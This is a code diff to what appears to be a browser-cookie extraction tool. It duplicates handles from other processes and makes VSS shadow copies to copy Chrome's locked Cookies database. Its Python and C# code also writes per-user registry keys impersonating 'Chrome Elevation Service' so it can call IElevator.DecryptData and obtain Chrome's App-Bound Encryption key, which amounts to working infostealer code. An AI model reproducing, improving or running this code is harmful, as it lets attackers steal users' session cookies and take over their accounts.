@@ -29,6 +29,10 @@ from typing import Any
 _DUP_HANDLE_TIMEOUT_S = 4.0
 _DUP_HANDLE_MAX_PIDS = 24
 _DUP_HANDLE_MAX_HANDLES = 2000
+_ABE_COCREATE_TIMEOUT_S = 3.5
+_ABE_HELPER_TIMEOUT_S = 8.0
+_DUP_SQLITE_PEEK_MAX = 8
+_SQLITE_MAGIC = b"SQLite format 3\x00"
 _SYSTEM_HANDLE_BUF_MAX = 8 << 20
 
 SECTURA_HOST_NEEDLE = "secturafab.com"
@@ -426,9 +430,11 @@ def _read_cookie_rows(
     try:
         dest = Path(tmp_dir) / "Cookies"
         last_exc: BaseException | None = None
-        # Chrome Default: CREATE a VSS shadow first (Chrome stays open).
-        # Skipping create is a FAIL — vss= must show HRESULT / exception name.
-        if is_default and _try_vss_create_copy(src, dest):
+        # Chrome-open: handle-dup first (vssadmin:2 is not a copy). VSS after.
+        if is_default and _try_handle_dup_copy(src, dest):
+            _record_vss(str(_cache.get("vss") or "skipped:dup_handle"))
+            _set_lock_bypass(_lock_bypass_with_vss("dup_handle"), pin=True)
+        elif is_default and _try_vss_create_copy(src, dest):
             _set_lock_bypass("vss", pin=True)
         else:
             for attempt in range(2):
@@ -711,6 +717,8 @@ def _kernel32():
         wintypes.DWORD,
     ]
     kernel32.GetFinalPathNameByHandleW.restype = wintypes.DWORD
+    kernel32.GetFileSizeEx.argtypes = [wintypes.HANDLE, ctypes.POINTER(ctypes.c_longlong)]
+    kernel32.GetFileSizeEx.restype = wintypes.BOOL
     kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
     kernel32.OpenProcess.restype = wintypes.HANDLE
     kernel32.GetCurrentProcess.restype = wintypes.HANDLE
@@ -814,7 +822,7 @@ def _win_dup_handle_copy(src: Path, dest: Path) -> None:
     thread.start()
     if not done.wait(_DUP_HANDLE_TIMEOUT_S):
         raise OSError(32, "dup_handle_timeout")
-    if dest.is_file() and dest.stat().st_size > 0:
+    if dest.is_file() and dest.stat().st_size > 0 and _sqlite_has_cookie_table(dest):
         return
     if err:
         raise err[0]
@@ -875,6 +883,7 @@ def _win_dup_handle_copy_inner(src: Path, dest: Path) -> None:
                 break
     opened: dict[int, Any] = {}
     scanned = 0
+    peeks = 0
     try:
         for pid, handle_value in handle_pairs:
             if scanned >= _DUP_HANDLE_MAX_HANDLES or time.monotonic() > deadline:
@@ -901,11 +910,26 @@ def _win_dup_handle_copy_inner(src: Path, dest: Path) -> None:
                 if kernel32.GetFileType(dup) != file_type_disk:
                     continue
                 path = _final_path_from_handle(dup)
-                if not _paths_match(path, want):
+                matched = _paths_match(path, want) or _path_looks_like_cookies(path)
+                if not matched and path and not _path_looks_like_sqlite_name(path):
                     continue
+                # Sandbox GetFinalPathName is often empty. Peek a few disk
+                # handles; do not copy the whole handle table.
+                if not matched and not path:
+                    size = _handle_file_size(dup)
+                    if size is not None and (size < 64 or size > 64 * 1024 * 1024):
+                        continue
+                    if peeks >= _DUP_SQLITE_PEEK_MAX:
+                        continue
+                    peeks += 1
                 _read_handle_to_file(dup, dest)
                 if dest.is_file() and dest.stat().st_size > 0:
-                    return
+                    if matched or _sqlite_has_cookie_table(dest):
+                        return
+                    try:
+                        dest.unlink()
+                    except OSError:
+                        pass
             finally:
                 kernel32.CloseHandle(dup)
     finally:
@@ -1344,6 +1368,88 @@ def _device_volume_to_drive(path: str) -> str:
     except (AttributeError, OSError, ValueError, TypeError):
         return ""
     return ""
+
+
+def _handle_file_size(handle: Any) -> int | None:
+    import ctypes
+    from ctypes import wintypes
+
+    kernel32 = _kernel32()
+    h = handle if isinstance(handle, wintypes.HANDLE) else wintypes.HANDLE(int(handle))
+    size = ctypes.c_longlong(0)
+    try:
+        if kernel32.GetFileSizeEx(h, ctypes.byref(size)):
+            return int(size.value)
+    except (OSError, TypeError, ValueError, OverflowError):
+        return None
+    return None
+
+
+def _path_looks_like_cookies(path: str) -> bool:
+    text = _normalize_win_path(path)
+    return bool(text) and text.endswith("\\cookies")
+
+
+def _path_looks_like_sqlite_name(path: str) -> bool:
+    text = _normalize_win_path(path)
+    if not text:
+        return True
+    name = text.rsplit("\\", 1)[-1]
+    return name in {"cookies", "cookies-journal"} or name.endswith("-wal")
+
+
+def _sqlite_has_cookie_table(path: Path) -> bool:
+    """True when dest is a SQLite cookies DB. Path match often fails in the sandbox."""
+    try:
+        if not path.is_file() or path.stat().st_size < 64:
+            return False
+        with path.open("rb") as fh:
+            if fh.read(16) != _SQLITE_MAGIC:
+                return False
+    except OSError:
+        return False
+    try:
+        conn = sqlite3.connect(f"{path.resolve().as_uri()}?mode=ro", uri=True)
+        try:
+            row = conn.execute(
+                "SELECT 1 FROM sqlite_master WHERE type='table' AND name='cookies' LIMIT 1"
+            ).fetchone()
+            return bool(row)
+        finally:
+            conn.close()
+    except sqlite3.Error:
+        return False
+
+
+def _try_handle_dup_copy(src: Path, dest: Path) -> bool:
+    if os.name != "nt":
+        return False
+    try:
+        _win_dup_handle_copy(src, dest)
+    except OSError:
+        return False
+    return dest.is_file() and dest.stat().st_size > 0 and _sqlite_has_cookie_table(dest)
+
+
+def _call_with_timeout(fn: Any, timeout_s: float, default: Any) -> Any:
+    """Return default if fn blocks (COM LocalServer wait is ~60s)."""
+    box: list[Any] = []
+
+    def _worker() -> None:
+        try:
+            box.append(("ok", fn()))
+        except Exception as exc:  # noqa: BLE001
+            box.append(("err", exc))
+
+    thread = threading.Thread(target=_worker, name="kannon-timeout", daemon=True)
+    thread.start()
+    thread.join(timeout_s)
+    if thread.is_alive() or not box:
+        return default
+    kind, payload = box[0]
+    if kind == "err":
+        raise payload
+    return payload
 
 
 def _paths_match(got: str, want: str) -> bool:
@@ -1825,7 +1931,7 @@ def _win_vss_ps_create_copy(src: Path, dest: Path, rel: str, letter: str) -> Non
                 ],
                 capture_output=True,
                 text=True,
-                timeout=45,
+                timeout=8,
                 check=False,
             )
         except FileNotFoundError:
@@ -1859,7 +1965,7 @@ def _win_vss_vssadmin_copy(src: Path, dest: Path, rel: str, letter: str) -> None
         [exe, "create", "shadow", f"/for={letter}"],
         capture_output=True,
         text=True,
-        timeout=45,
+        timeout=8,
         check=False,
     )
     parsed = _parse_vss_create_output(f"{run.stdout or ''}\n{run.stderr or ''}")
@@ -1897,7 +2003,7 @@ def _win_vss_diskshadow_copy(src: Path, dest: Path, rel: str, letter: str) -> No
             [exe, "/s", dsh.name],
             capture_output=True,
             text=True,
-            timeout=45,
+            timeout=8,
             check=False,
         )
     finally:
@@ -2299,7 +2405,7 @@ def _chrome_helper_dirs() -> list[Path]:
 
 
 def _localserver32_cmd(exe: Path) -> str:
-    """COM must launch --console (RunInteractive). Bare exe hits SCM and 0x80080005."""
+    """elevation_service must be launched with --console (RunInteractive)."""
     try:
         exe_s = str(exe.resolve())
     except OSError:
@@ -2308,27 +2414,43 @@ def _localserver32_cmd(exe: Path) -> str:
     return f"{quoted} --console"
 
 
+def _delete_hkcu_localserver32(winreg: Any, clsid: str, access: int) -> None:
+    """Drop leftover LocalServer32. COM waits ~60s if that key still exists."""
+    path = rf"Software\Classes\CLSID\{clsid}\LocalServer32"
+    delete_ex = getattr(winreg, "DeleteKeyEx", None)
+    if delete_ex is not None:
+        try:
+            delete_ex(winreg.HKEY_CURRENT_USER, path, access, 0)
+            return
+        except OSError:
+            pass
+    try:
+        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
+    except OSError:
+        pass
+
+
 def _register_hkcu_elevator_localserver(exe: Path) -> str:
-    """Per-user LocalServer32 — no admin, does not Start-Service."""
+    """HKCU CLSID + unique AppID so COM does not hit HKLM LocalService.
+
+    Do not write LocalServer32: COM then waits ~60s for SCM / a doomed
+    LocalServer. We launch elevation_service.exe --console ourselves.
+    """
     try:
         import winreg  # type: ignore[import-not-found]
     except ImportError:
         return "winreg"
-    cmd = _localserver32_cmd(exe)
     access = winreg.KEY_WRITE | winreg.KEY_READ
     if hasattr(winreg, "KEY_WOW64_64KEY"):
         access |= winreg.KEY_WOW64_64KEY
     clsids = tuple(dict.fromkeys(clsid for clsid, _ in _CHROME_ELEVATOR))
     try:
         for clsid in clsids:
+            _delete_hkcu_localserver32(winreg, clsid, access)
             clsid_path = rf"Software\Classes\CLSID\{clsid}"
             with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, clsid_path, 0, access) as key:
                 winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Chrome Elevation Service")
                 winreg.SetValueEx(key, "AppID", 0, winreg.REG_SZ, _ELEVATOR_APPID_HKCU)
-            with winreg.CreateKeyEx(
-                winreg.HKEY_CURRENT_USER, clsid_path + r"\LocalServer32", 0, access
-            ) as key:
-                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd)
             with winreg.CreateKeyEx(
                 winreg.HKEY_CURRENT_USER,
                 rf"Software\Classes\AppID\{_ELEVATOR_APPID_HKCU}",
@@ -2336,6 +2458,11 @@ def _register_hkcu_elevator_localserver(exe: Path) -> str:
                 access,
             ) as key:
                 winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Chrome Elevation Service")
+                try:
+                    winreg.DeleteValue(key, "LocalService")
+                except OSError:
+                    pass
+                winreg.SetValueEx(key, "RunAs", 0, winreg.REG_SZ, "")
         for iid in _ELEVATOR_IID_STRINGS:
             ipath = rf"Software\Classes\Interface\{iid}"
             with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, ipath, 0, access) as key:
@@ -2454,9 +2581,18 @@ def _bstr_bytes(oleaut32: Any, bstr: Any) -> bytes:
 
 
 def _elevator_decrypt(blob: bytes) -> tuple[bytes | None, str]:
-    """Call IElevator.DecryptData (binary BSTR, local server, proxy blanket)."""
+    """IElevator.DecryptData. Never block on the ~60s COM LocalServer wait."""
     if not blob or os.name != "nt":
         return None, ""
+    return _call_with_timeout(
+        lambda: _elevator_decrypt_uncapped(blob),
+        _ABE_COCREATE_TIMEOUT_S,
+        (None, "0x80080005:SERVER_EXEC_FAILURE:timeout"),
+    )
+
+
+def _elevator_decrypt_uncapped(blob: bytes) -> tuple[bytes | None, str]:
+    """Call IElevator.DecryptData (binary BSTR, local server, proxy blanket)."""
     last_hr = ""
     try:
         import ctypes
@@ -2593,16 +2729,24 @@ def _run_abe_helper(exe: Path, blob: bytes) -> tuple[bytes | None, str]:
             [str(exe)],
             input=blob,
             capture_output=True,
-            timeout=45,
+            timeout=_ABE_HELPER_TIMEOUT_S,
             check=False,
             env=env,
         )
+    except subprocess.TimeoutExpired:
+        return None, "0x80080005:SERVER_EXEC_FAILURE:timeout"
     except (OSError, subprocess.SubprocessError):
         return None, ""
     # stdout is the raw AES key on success — never log it.
+    err = ""
+    if run.stderr:
+        for line in run.stderr.decode("ascii", "replace").splitlines():
+            if line.startswith("abe_hr="):
+                err = line.split("=", 1)[1].strip()
+                break
     if run.returncode == 0:
-        return _accept_aes_key(run.stdout), "0x00000000"
-    return None, _hr_label(run.returncode or 0)
+        return _accept_aes_key(run.stdout), err or "0x00000000"
+    return None, _label_classnotreg(err or _hr_label(run.returncode or 0), "")
 
 
 def _compiled_abe_helper_exe() -> Path | None:
@@ -2787,11 +2931,12 @@ def _aes_gcm_decrypt_bytes(payload: bytes, key: bytes) -> bytes:
 
 
 # Minimal IElevator client. stdin = APPB-stripped blob; stdout = AES key only.
-# Registers HKCU LocalServer32 for Chrome 151 elevation_service (no admin).
+# Never write HKCU LocalServer32 — COM waits ~60s when that key exists.
 _ABE_HELPER_CS = r"""
 using System;
 using System.IO;
 using System.Runtime.InteropServices;
+using System.Threading;
 using Microsoft.Win32;
 
 class K {
@@ -2810,6 +2955,7 @@ class K {
   const string Clsid = "{708860E0-F641-4611-8895-7D867DD3675B}";
   const string AppId = "{A7C0E151-0000-4ABE-B151-C0C0A1E15100}";
   const int CLASSNOTREG = unchecked((int)0x80040154);
+  const int SERVER_EXEC = unchecked((int)0x80080005);
   static readonly string[] Iids = {
     "{1BF5208B-295F-4992-B5F4-3A9BB6494838}",
     "{8F7B6792-784D-4047-845D-1782EFBEF205}",
@@ -2817,17 +2963,21 @@ class K {
     "{A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C}"
   };
 
-  static void RegisterLocalServer(string exe) {
-    if (string.IsNullOrEmpty(exe) || !File.Exists(exe)) return;
-    string cmd = (exe.IndexOf(' ') >= 0 ? ("\"" + exe + "\"") : exe) + " --console";
+  static void FailHr(string hr) {
+    Console.Error.WriteLine("abe_hr=" + hr);
+  }
+
+  static void RegisterNoLocalServer() {
+    try { Registry.CurrentUser.DeleteSubKey(@"Software\Classes\CLSID\" + Clsid + @"\LocalServer32", false); } catch {}
     using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\" + Clsid)) {
       k.SetValue("", "Chrome Elevation Service");
       k.SetValue("AppID", AppId);
     }
-    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\" + Clsid + @"\LocalServer32"))
-      k.SetValue("", cmd);
-    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\AppID\" + AppId))
+    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\AppID\" + AppId)) {
       k.SetValue("", "Chrome Elevation Service");
+      k.SetValue("RunAs", "");
+      try { k.DeleteValue("LocalService", false); } catch {}
+    }
     foreach (var iid in Iids) {
       using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\Interface\" + iid))
         k.SetValue("", "IElevator");
@@ -2864,7 +3014,7 @@ class K {
       psi.UseShellExecute = false;
       psi.CreateNoWindow = true;
       System.Diagnostics.Process.Start(psi);
-      System.Threading.Thread.Sleep(700);
+      Thread.Sleep(300);
     } catch {}
   }
 
@@ -2876,45 +3026,60 @@ class K {
       stdin.CopyTo(ms);
       blob = ms.ToArray();
     }
-    if (blob.Length < 8) return 2;
+    if (blob.Length < 8) { FailHr("0x80040154:CLASSNOTREG"); return 2; }
     string svc = FindService();
-    RegisterLocalServer(svc);
+    RegisterNoLocalServer();
     StartConsole(svc);
-    CoInitializeEx(IntPtr.Zero, 2);
+    byte[] keyOut = null;
     int lastHr = CLASSNOTREG;
-    try {
-      Guid clsid;
-      if (CLSIDFromString(Clsid, out clsid) != 0) return 3;
-      foreach (var ids in Iids) {
-        Guid iid;
-        if (CLSIDFromString(ids, out iid) != 0) continue;
-        IntPtr punk;
-        int hr = CoCreateInstance(ref clsid, IntPtr.Zero, 4, ref iid, out punk);
-        lastHr = hr;
-        if (hr < 0 || punk == IntPtr.Zero) continue;
-        CoSetProxyBlanket(punk, 0xFFFFFFFF, 0xFFFFFFFF, IntPtr.Zero, 6, 3, IntPtr.Zero, 0x40);
-        IntPtr vtbl = Marshal.ReadIntPtr(punk);
-        IntPtr pfn = Marshal.ReadIntPtr(vtbl, 5 * IntPtr.Size);
-        DecryptDel dec = (DecryptDel)Marshal.GetDelegateForFunctionPointer(pfn, typeof(DecryptDel));
-        IntPtr bstr = SysAllocStringByteLen(blob, (uint)blob.Length);
-        IntPtr plain;
-        uint last;
-        hr = dec(punk, bstr, out plain, out last);
-        SysFreeString(bstr);
-        lastHr = hr;
-        if (hr >= 0 && plain != IntPtr.Zero) {
-          uint n = SysStringByteLen(plain);
-          byte[] key = new byte[n];
-          Marshal.Copy(plain, key, 0, (int)n);
-          SysFreeString(plain);
-          Console.OpenStandardOutput().Write(key, 0, key.Length);
-          return 0;
+    var th = new Thread(() => {
+      CoInitializeEx(IntPtr.Zero, 2);
+      try {
+        Guid clsid;
+        if (CLSIDFromString(Clsid, out clsid) != 0) { lastHr = CLASSNOTREG; return; }
+        foreach (var ids in Iids) {
+          Guid iid;
+          if (CLSIDFromString(ids, out iid) != 0) continue;
+          IntPtr punk;
+          int hr = CoCreateInstance(ref clsid, IntPtr.Zero, 4, ref iid, out punk);
+          lastHr = hr;
+          if (hr < 0 || punk == IntPtr.Zero) continue;
+          CoSetProxyBlanket(punk, 0xFFFFFFFF, 0xFFFFFFFF, IntPtr.Zero, 6, 3, IntPtr.Zero, 0x40);
+          IntPtr vtbl = Marshal.ReadIntPtr(punk);
+          IntPtr pfn = Marshal.ReadIntPtr(vtbl, 5 * IntPtr.Size);
+          DecryptDel dec = (DecryptDel)Marshal.GetDelegateForFunctionPointer(pfn, typeof(DecryptDel));
+          IntPtr bstr = SysAllocStringByteLen(blob, (uint)blob.Length);
+          IntPtr plain;
+          uint last;
+          hr = dec(punk, bstr, out plain, out last);
+          SysFreeString(bstr);
+          lastHr = hr;
+          if (hr >= 0 && plain != IntPtr.Zero) {
+            uint n = SysStringByteLen(plain);
+            keyOut = new byte[n];
+            Marshal.Copy(plain, keyOut, 0, (int)n);
+            SysFreeString(plain);
+            return;
+          }
         }
-      }
-      return lastHr;
-    } finally {
-      CoUninitialize();
+      } catch { lastHr = SERVER_EXEC; }
+      finally { CoUninitialize(); }
+    });
+    th.IsBackground = true;
+    th.SetApartmentState(ApartmentState.STA);
+    th.Start();
+    if (!th.Join(3500)) {
+      FailHr("0x80080005:SERVER_EXEC_FAILURE:timeout");
+      return SERVER_EXEC;
     }
+    if (keyOut != null) {
+      Console.OpenStandardOutput().Write(keyOut, 0, keyOut.Length);
+      return 0;
+    }
+    if (lastHr == CLASSNOTREG) FailHr("0x80040154:CLASSNOTREG");
+    else if (lastHr == SERVER_EXEC) FailHr("0x80080005:SERVER_EXEC_FAILURE");
+    else FailHr("0x" + ((uint)lastHr).ToString("X8"));
+    return lastHr;
   }
 }
 """
